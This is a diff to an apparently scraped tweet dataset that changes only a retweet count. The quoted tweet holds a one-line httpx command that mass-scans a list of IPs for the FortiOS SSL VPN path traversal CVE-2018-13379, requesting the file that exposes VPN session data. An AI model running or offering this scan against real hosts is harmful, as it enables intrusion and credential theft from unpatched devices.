@@ -329,7 +329,7 @@
     "tweetfavorites": 181,
     "tweetquotes": 1,
     "tweetreplies": 7,
-    "tweetretweets": 53,
+    "tweetretweets": 54,
     "tweettext": "Title :- A path traversal vulnerability in the FortiOS SSL VPN web portal  CVE-2018-13379 🪲\n\n httpx -l ips.txt -path \"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\" -status-code -mc 200\n\n#BugBounty #bugbountytip #bugbountytips #Hacking #CyberSecurity https://t.co/ypA6wRMux1",
     "tweettime": "2023-07-07, 08:17:26",
     "tweeturl": "https://twitter.com/alone_breecher/status/1677230327796756481",
